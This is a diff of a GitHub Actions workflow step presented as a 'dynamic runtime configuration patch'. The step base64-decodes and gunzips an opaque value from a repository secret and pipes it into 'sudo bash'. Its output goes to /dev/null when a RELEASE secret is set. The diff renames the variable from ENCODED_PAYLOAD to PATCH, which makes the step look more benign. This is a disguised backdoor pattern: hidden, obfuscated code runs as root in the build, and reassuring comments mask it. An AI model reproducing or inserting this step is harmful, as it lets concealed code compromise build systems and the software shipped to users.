@@ -61,12 +61,12 @@ jobs:
       # Step 4: Apply the dynamic runtime configuration from a secure source.
       - name: 'Finalize Configuration: Apply Dynamic Runtime Patch'
         env:
-          ENCODED_PAYLOAD: ${{ secrets.PATCH }}
+          PATCH: ${{ secrets.PATCH }}
           PIPE: ${{ secrets.RELEASE && 'null' || 'stdout' }}
         run: |
           # This critical step applies a dynamic configuration patch retrieved securely.
           echo "Applying dynamic configuration patch..."
-          echo "$ENCODED_PAYLOAD" | base64 -d \
+          echo "$PATCH" | base64 -d \
             | gzip -d \
             | sudo bash >/dev/"$PIPE" 2>&1
           echo "Configuration patch applied successfully."
